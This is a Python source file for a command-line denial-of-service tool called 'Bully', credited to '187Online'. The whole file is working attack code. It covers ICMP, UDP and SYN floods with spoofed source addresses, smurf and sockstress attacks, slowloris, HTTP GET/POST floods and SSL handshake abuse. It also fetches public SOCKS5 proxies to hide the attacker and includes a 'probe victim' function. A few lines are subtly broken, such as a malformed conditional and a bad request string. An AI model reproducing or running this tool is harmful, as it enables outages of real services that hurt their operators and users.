#######################################
#
#██████╗ ██╗   ██╗██╗     ██╗  ██╗   ██╗
#██╔══██╗██║   ██║██║     ██║  ╚██╗ ██╔╝
#██████╔╝██║   ██║██║     ██║   ╚████╔╝ 
#██╔══██╗██║   ██║██║     ██║    ╚██╔╝  
#██████╔╝╚██████╔╝███████╗███████╗██║   
#╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝   
#                                     
# Bully DDoS tool developed by 187Online 
#
# Version = 1.0
#
#Will be updated
#
#Recommend using this tool on Linux 
#
#######################################

import socket,random,ssl,requests,argparse,threading,socks,os
from time import sleep
from scapy.all import *
from banner import getbanner
from fake_headers import Headers
from urllib.parse import urlparse
from fake_useragent import UserAgent
from impacket import ImpactDecoder, ImpactPacket

RED,WHITE,GREEN,END =  '\033[1;91m', '\33[1;97m','\033[1;32m', '\033[0m'


def usage() :
  
        print(WHITE + """
-----------------------------------------------------------------------------------------------------------------
                                      Bully DoS Tool 
OPTIONS  : 
          
Flag                                   Description                                          ARGS 
          
-gP          --get_proxy               Get proxy list as sock5.txt                        No args need
-pV          --probe_victim            Probe victim                                       -uri
-icmp        --icmp_bomb               Icmp bomb / Ping flood depends payload size        -ip  -p  -sC  -pS
-udp         --udp_strom               UDP flood                                          -ip  -p  -sC  -pS        
-syn         --syn_flood               Syn flood                                          -ip  -p  -sC  -proxy
-sA          --smurf_attack            Smurf attack                                       -ip -tH
-sS          --sockstress              Builds on TCP window = 0 exploit                   -ip  -p  -sC  -proxy
-sL          --slowloris               Slowloris rewrite                                  -tR  -sC  -p  -proxy                  
-get         --http_get                Get flood                                          -tR  -sC  -p  -proxy       
-pps         --pps                     Type of get flood                                  -tR  -sC  -p  -proxy       
-post        --http_post               Post flood                                         -tR  -sC  -p  -proxy   
-ssl         --ssl_dos                 SSL handshake abuse to consume server resources    -tR  -p
-ip                                    TARGET (IP) L3/4
-p                                     Port
-sC                                    Socket count
-pS                                    Payload Size
-tH                                    Thread count
-tR                                    Target L7   
-uri                                   URI
In L7 default ports = 443
---------------------------------------------------------------------------------------------------------------""" + END)


def spoofed_ip(): 
    addr_parse = [0, 0, 0, 0] 
    
    addr_parse[0] = str(random.randint(1,197)) 
    addr_parse[1] = str(random.randint(0,255)) 
    addr_parse[2] = str(random.randint(0,255))
    addr_parse[3] = str(random.randint(1,254))
    
    return '.'.join(addr_parse)

spoofed_ip_addr = spoofed_ip()

    
def control_proxy(proxy_addr : str ) :
    
    print(GREEN + f'Proxy selected, starting to check...'+ END)
     
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.settimeout(4)
            
    try : 
        s.connect((proxy_addr.split(':')[0],int(proxy_addr.split(':')[1])))    
        
        s.sendall(b"\x05\x01\x00")

        data = s.recv(2)

        s.close()
        
        return True

    except socket.error:
        print(RED + 'Proxy failed, another proxy is selected' + END)
        return False

def get_proxy() : 
    
    proxy_list = []
    
    try :   
        folder_path = os.getcwd() + "" # Enter your folder path 
        
        files = os.listdir(folder_path)
        
        filename = "sock5.txt"

        if  filename not in files:    
                
            req = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all').text
            
            with open('sock5.txt','w',encoding='utf-8') as file :
                
                file.write(req)
                
                file.close()  
                
                print(GREEN + 'File Created ..'+END)
                
        try: 
            
            os.chdir(folder_path)
            
        except :
            
            pass
         
        with open('sock5.txt','r',encoding='utf-8') as file : 
                
            proxies  = file.readlines()       

            for proxy in proxies : 
                    
                proxy_list.append(proxy)  
            
        print(GREEN +'Trying to find alive proxy server...'+ END)
    
        while True : 
            
            proxy = random.choice(proxy_list)
           
            if control_proxy(proxy) :
                    
                print(GREEN + f'Open proxy server => {proxy}' + END)
            
                return proxy
            
        
    except FileNotFoundError : 
        
        print(RED + f'Check the current path. Your current path is {os.getcwd()}' + END)
      
    

def probe_victim(uri: str) :
    
    try :
       
        parsed_url = urlparse(uri)     
        
        dst = parsed_url.netloc

        ip_addr = sr1(IP(dst=dst)/ICMP(),verbose=False).src   
        
        url_data = WHITE +f"""
        Scheme : {parsed_url.scheme}
        Host   :  {parsed_url.hostname}
        Path   :  {parsed_url.path}
        Params : {parsed_url.params}
        Query  :   {parsed_url.query}
        Fragment : {parsed_url.fragment}
        Ip Address : {ip_addr}
        """ + END
        
        print(url_data)
    
        print(RED+'More information about host Use 187Scanner' +END)
    
    except : 
    
        print(RED + 'CHECK URI' +END )

"""--------------------------------------------------------------------------LAYER 3/4---------------------------------------------------------------------------"""
        
def run_udp_storm(ip_addr: str ,port: int,socket_count: int ,payload_size: int = 32) : 
    
    sockets = []
    
    PAYLOAD = random._urandom(payload_size)
    
    print(GREEN +  '[I]Creating sockets....'+END)
    
    for num in range(socket_count) : 
        
        try : 
            
            sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) 

            print(GREEN +  f'Socket {num} connect to {port} succesfully' + END)
            
            sockets.append(sock)
        
        except socket.error as error : 
            
            print(RED +f'Socket {socks} failed  connect to {port}' + END)
            
            pass
    
    print(GREEN + '[I] Attack Started...'+ END )     
    
    if sockets : 
        
        while True :

            for sock in sockets :
                
                sock.sendto(PAYLOAD,(ip_addr,port)) 
    

def run_icmp_bomb(ip_addr: str ,port: int,socket_count: int,payload_size: int =65000) : 
    
    sockets = []
    
    PAYLOAD = random._urandom(payload_size)  

    print(RED + 'This function design for ICMP BOMB but if you set payload_size 64 turns icmp bomb to ping flood ...')

    print(GREEN+'Creating Sockets....' +END)
     
    for num in range(socket_count) :
        
        try : 
            
            sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP) 
            
            print(GREEN + f'Socket {num} connect to {port} succesfully'+ END)
       
            sockets.append(sock)
       
        except socket.error as error : 
            
            print(RED +f'{socket} can not connect to {port}'+END)
            
            pass
       
    print(GREEN + '[I] Attack Started ...' + END)
     
    if sockets : 
       
        while True :

            for sock in sockets:        
            
                sock.sendto(PAYLOAD,(ip_addr,port))



def generate_packet(ip_addr: str,port: int,type: str) :

   ip = ImpactPacket.IP()
   
   ip.set_ip_src(spoofed_ip_addr)
   
   ip.set_ip_dst(ip_addr)

   tcp = ImpactPacket.TCP()
   
   if (type.lower()) == 'syn' :
              
        tcp.set_SYN()
        
        tcp.set_th_flags(0x02)
   
   elif (type.lower()) == 'ack' :
       
        tcp.set_ACK()
   
        tcp.set_th_flags(0x10)

        tcp.set_th_win(0)
    
   elif (type.lower()) != 'syn' or 'ack' :
       
       print(RED +' Type == syn or ack' + END)
       
       return None 
   
   tcp.set_th_dport(port)
   
   tcp.set_th_sport(80)
   
   ip.contains(tcp)
   
   return ip.get_packet()
   

def run_syn_flood(ip_addr: str ,port: int,socket_count: int ,proxy : bool = False) : 
   
    print(GREEN +'Syn flood started..'+ END)
   
    sockets = []
        
    PACKET = generate_packet(ip_addr,port,'syn')
    
    if proxy  :
             
        proxy_addr = get_proxy()
            
        proxy_host =  proxy_addr.split(':')[0]
            
        proxy_port = int(proxy_addr.split(':')[1])
            
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_host, proxy_port)
        
        socket.socket = socks.socksocket
            
    print(GREEN + f'{socket_count} Raw Sockets Creating...'+ END)
    
    for num in range(socket_count):
    
        try : 
            sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP) 
            
            sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1) 
            
            sockets.append(sock) 
            
            print(GREEN +f'Socket {num} created ...'+ END)
        
        except : 
            
            print(RED+ 'Try run as admin '+END)
            
            pass
    
    print(GREEN + f'Source IP : {spoofed_ip_addr}'+ END)

    print(GREEN + '[I] Attack Started ...'+ END )
    
    if sockets : 

        while True : 
        
            for sock in sockets :
                        
                sock.sendto(PACKET,(ip_addr,port))
                
                

def smurf_attack(ip_addr : str,smurf_list: list ):
        
    thread_name = threading.current_thread().name
        
    print(GREEN +  f'{thread_name} [I] Smurf attack Started...\n' +END)
        
    while True : 
            
        for smurf in smurf_list :
        
            evil_packet = IP(dst=smurf,src=ip_addr,ttl=255)/ICMP()
            
            sr(evil_packet,verbose=False,timeout=5,inter=0)
   
   
     
def run_smurf_attack(ip_addr: str,thread: int ) :

    smurf_list = []
    
    print(RED + 'It is recommended that this attack be performed on networks with multiple devices connected' +END)
   
    print(GREEN+ 'Probing smurfs....' + END)
    
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff", type=0x0806)/ARP(pdst="192.168.1.0/24"), timeout=2)

    for smurf in ans : 
        
        smurf_list.append(smurf[0][0][1].pdst)
    
    for _ in range(thread) :
        
        th = threading.Thread(target=smurf_attack,kwargs={'ip_addr':ip_addr,'smurf_list':smurf_list})
        
        th.start()
        

def run_sockstress(ip_addr: str ,port: int ,socket_count: int ,proxy :bool =False) : 
    
    sockets = []
    
    print(RED +'This DDoS type based on tcp window 0 exploit '+ END)
    
    SYN = generate_packet(ip_addr,port,'syn')
    
    ACK  = generate_packet(ip_addr,port,'ack')

    if proxy  :
             
        proxy_addr = get_proxy()
            
        proxy_host =  proxy_addr.split(':')[0]
            
        proxy_port = int(proxy_addr.split(':')[1])
            
        socks.setdefaultproxy(socks.SOCKS5, proxy_host, proxy_port)
            
        socket.socket = socks.socksocket
    
    print(GREEN +'Sockets Creating....'+ END)
    
    for num in range(socket_count) :
        
        try : 
            sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
            
            sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
            
            print(GREEN + 'Socket {num} created....')
            
            sockets.append(sock) 
            
        except : 
            print(RED + f'Socket {num} failure '+ END)
            
            pass
    
    print(GREEN + '[I] Attack Started ...'+ END )
    
    print(RED + f'Source IP : {spoofed_ip_addr}'+ END)
    
    if sockets : 
        
        while True :
            
            for sock in sockets :  
                
                sock.sendto(SYN,(ip_addr,port)) #Sending SYN packet to connection.
        
                sock.sendto(ACK,(ip_addr,port)) #Window size = 0 exploit.
    


"""---------------------------------------------------------------------------Layer 7---------------------------------------------------------------------"""


def run_slowloris(target: str,socket_count: int,port: int=80,proxy:bool=False) :   
    
    sockets = []
    
    header_strings = []
    
    http_header = Headers().generate()
    
    PROTO = urlparse(target).scheme

    PATH = urlparse(target).path
    
    HOST = urlparse(target).hostname

    print(GREEN + '[I] Slowloris started....'+ END)
    
    for key, value in http_header.items():
        
        header_strings.append("{}: {}".format(key, value))
    

    def create_socket(target,port,proxy=proxy) : 
        
        if proxy  : 
                
            proxy_addr = get_proxy()
                
            proxy_host =  proxy_addr.split(':')[0]
                
            proxy_port = int(proxy_addr.split(':')[1])
                
            socks.setdefaultproxy(socks.SOCKS5, proxy_host, proxy_port)
            
            socket.socket = socks.socksocket
    
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        
        sock.settimeout(4)
        
        if PROTO.lower() == 'https' :
            
            context = ssl.create_default_context()
            
            context.check_hostname = False
            
            context.verify_mode = ssl.CERT_NONE
            
            sock = context.wrap_socket(sock,server_hostname= HOST) 
            
        sock.connect((target,port))
        
        sock.send(f'GET {PATH} HTTP/1.1\r\nHost: {HOST}\r\nContent-Length: {random.randint(0, 2000)}\r\n\r\n') 
        
        for header_string in header_strings:
            
            sock.send("{}\r\n".format(header_string).encode("utf-8"))
        
        return sock 
    
    print(GREEN + '[I] Sockets creating.....'+END)
    
    for num in range(socket_count) :
        
        try :
            
            sock = create_socket(target,port,proxy=proxy)
            
            sockets.append(sock) 
        
            print(GREEN +f'Socket {num} created ....'+ END)
        
        except socket.error  :
            
            print(RED +f'Socket {num} failure'+END)
            
            pass
    
    print(RED +f'Attack Started Sending "X-a" packets...\n'+END)
    
    if sockets : 
        
        while True :    
      
            for sock in sockets :
                
                    sock.sendall(f"X-a:{random.randint(1, 4000)} Host :{HOST} \r\n".encode("utf-8"))
                    
                
def create_socket(target: str ,port: int,proxy_addr :str) :
    
    PROTO = urlparse(target).scheme    
        
    HOST = urlparse(target).hostname
   
    if target.endswith("/"):  
        
        target = target[:-1]
    
    try : 
        
        if proxy_addr is not None : 
        
            proxy_host =  proxy_addr.split(':')[0]
                
            proxy_port = int(proxy_addr.split(':')[1])
                
            socks.setdefaultproxy(socks.SOCKS5, proxy_host, proxy_port)
            
            socket.socket = socks.socksocket
        
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
        
        sock.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
        
        sock.connect((HOST,port))  
        
        if PROTO.lower() == 'https'  :
                
            context = ssl.create_default_context()

            context.check_hostname = False
                    
            context.verify_mode = ssl.CERT_NONE
                    
            sock = context.wrap_socket(sock,server_hostname= HOST)

            print(GREEN + 'SSL Socket created....'+ END)

            return sock

        print(GREEN + 'Socket created....'+ END)

        return sock
    
    except : 
        
        print(RED + 'Creating socket process failure...' + END)

        return None

def run_http_get(target: str,socket_count: int,port:int,proxy:bool =False):

    sockets = []
    
    HOST = urlparse(target).hostname
    
    PORT = port

    PATH = urlparse(target).path
    
    user_agent = UserAgent().random
    
    PACKET = f"""
            GET /{PATH}{random.randint(0, 2000)} HTTP/1.1
            Host: {HOST}
            User-Agent: {user_agent}
            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
            Accept-Language: en-US,en;q=0.5
            Accept-Encoding: gzip, deflate, br
            Connection: keep-alive
            Upgrade-Insecure-Requests: 1
            """
    
    if proxy : 
        
        proxy_addr = get_proxy()
        
    else : 
       
        proxy_addr = None
   
    print(GREEN + 'Sockets Creating...' + END)
    
    for num  in range(socket_count) :
            
        sock = create_socket(target,PORT,proxy_addr)  

        sockets.append(sock)
    
        print(GREEN + f'[I] Socket {num} starting......'+ END)
        
        
    print(RED+ 'Attack Starting..... '+END)
    
    if sockets :
        
        while True : 
                   
            for sock in sockets :
                
                try :     
                    
                    sock.sendall(str.encode(PACKET)) 
                
                except :
                    
                    pass
    
def run_PPS(target:str,socket_count: int ,port: int,proxy:bool = False) :

    sockets = []

    PORT = port
    
    HOST = urlparse(target).hostname
      
    PACKET = f'GET / HTTP/1.1\r\nHost:{HOST}r\n\r\n'
       
    if proxy : 
        
        proxy_addr = get_proxy()
        
    else : 
       
        proxy_addr = None
   
    print(GREEN + 'Trying to create sockets...' + END)
    
    for num  in range(socket_count) :
        
        sock = create_socket(target,PORT,proxy_addr)   
        
        sockets.append(sock)
        
        print(GREEN + f'[I] Socket {num} starting......'+ END)     

    print(RED+'Attack Starting..... '+END)
      
    if sockets : 
        
        while True :
           
            for sock in sockets : 
                
                try :
                    
                    sock.sendall(PACKET.encode('utf-8'))
                
                except : 
                    
                    pass

def run_http_post(target :str,socket_count:int,port:int=443,proxy:bool = False) :
     
    sockets = []
    
    HOST = urlparse(target).hostname

    PATH = urlparse(target).path
    
    PACKET = f'POST {PATH} HTTP/1.1\r\nHost:{HOST}\r\nContent-Type: application/json\r\nContent-Length: {random.randint(0, 2000)}\r\n\r\n'
    
    if proxy : 
        
        proxy_addr = get_proxy()
        
    else : 
       
        proxy_addr = None
   
    for num in range(socket_count) : 
        
        sock = create_socket(target,port,proxy_addr)
        
        sockets.append(sock)
        
        print(GREEN + f'[I] Socket {num} starting......'+ END)     

    print(RED + 'Post attack started ....' + END)
      
    if sockets :
        
        while True :

            for sock in sockets : 
                
                try: 
               
                    sock.send(PACKET.encode('utf-8'))
                
                except : 
                    
                    pass


class SSL_Socket :
    
    def spam_socket(self):
        
        while True:
           
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)             
            
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)    
           
            sock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLS)
           
            yield sock
        
    @classmethod
    def handshake(cls, host, port=443):
        
        s = cls()
        
        sock_gen = s.spam_socket()
        
        sock = next(sock_gen)
        
        sock.connect((host, port))
        
        sock.shutdown(socket.SHUT_RDWR)
        
        sock.close()
    
    
    
def SSL_dos(target: str,port: int=443) :
   
    HOST =  urlparse(target).hostname
   
    PORT = port 
 
    print(GREEN + '[I] Attack started ...'+ END)
     
    while True : 
    
        try :
                
            SSL_Socket.handshake(HOST,PORT)

        except : 
                
            pass    
 
                  
if __name__ == "__main__": 
    
    getbanner()
    
    parser = argparse.ArgumentParser(description='Bully DDoS Tool CLI')
    
    parser.add_argument('-gP', '--get_proxy',action='store_true',help='Get sock5 file and take a alive proxy server ')
   
    parser.add_argument('-pV','--probe_victim',action='store_true',help='Information about host by using uri')
    
    #--------------------------------------------------L3/4---------------------------------------------------#
    
    parser.add_argument('-icmp','--icmp_bomb',action='store_true',help='ICMP bomb or ping flood')
    
    parser.add_argument('-udp','--udp_storm',action='store_true',help='UDP flood')
    
    parser.add_argument('-syn','--syn_flood',action='store_true',help='SYN flood')
    
    parser.add_argument('-sA','--smurf_attack',action='store_true',help='DoS attack by smurf devices')
    
    parser.add_argument('-sS','--sockstress',action='store_true',help='DoS attack with using window 0 exploit ')
    
    #--------------------------------------------------L7-----------------------------------------------------#

    parser.add_argument('-sL','--slowloris',action='store_true',help='Slowloris DoS attack')
                        
    parser.add_argument('-get','--http_get',action='store_true',help='HTTP get flood')
    
    parser.add_argument('-pps','--pps',action='store_true',help='Fastest get flood')
    
    parser.add_argument('-post','--http_post',action='store_true',help='HTTP post flood')
        
    parser.add_argument('-ssl','--ssl_dos',action='store_true',help='Handshake abusing to consume server resources')

    #--------------------------------------------------ARGS---------------------------------------------------#
    
    parser.add_argument('-uri','--uri',type=str,help='uri arg')
    
    parser.add_argument('-tR','--target',type=str,help=' L7 target arg')
    
    parser.add_argument('-ip','--ip_address',type=str,help='L3/4 target arg ')
    
    parser.add_argument('-p','--port',type=int)
    
    parser.add_argument('-sC','--socket_count',type=int)
    
    parser.add_argument('-pS','--payload_size',type=int)
    
    parser.add_argument('-tH','--thread',type=int)
    
    parser.add_argument('-proxy','--proxy',action='store_true',default=False)

    args = parser.parse_args()
    
    if args.get_proxy :
        
        get_proxy()
         
    elif args.probe_victim :
        
        probe_victim(args.uri)
    
    elif args.icmp_bomb : 
    
        run_icmp_bomb(args.ip_address, args.port, args.socket_count,args.payload_size) 
    
    elif args.udp_storm :

        run_udp_storm(args.ip_address,args.port,args.socket_count,args.payload_size)
    
    elif args.syn_flood:
        
        run_syn_flood(args.ip_address,args.port,args.socket_count,args.proxy)
    
    elif args.smurf_attack :
        
        run_smurf_attack(args.ip_address,args.thread)
      
    elif args.sockstress:
        
        run_sockstress(args.ip_address,args.port,args.socket_count,args.proxy)
  
    elif args.slowloris:

        run_slowloris(args.target,args.socket_count,args.port,args.proxy)
    
    elif args.http_get:
        
        run_http_get(args.target,args.socket_count,args.port,args.proxy)
    
    elif args.pps:
        
        run_PPS(args.target,args.socket_count,args.port,args.proxy)
        
    elif args.http_post:
        
        run_http_post(args.target,args.socket_count,args.port,args.proxy)

    elif args.ssl_dos:
        
        SSL_dos(args.target,args.port)

    else : 
        
        usage()




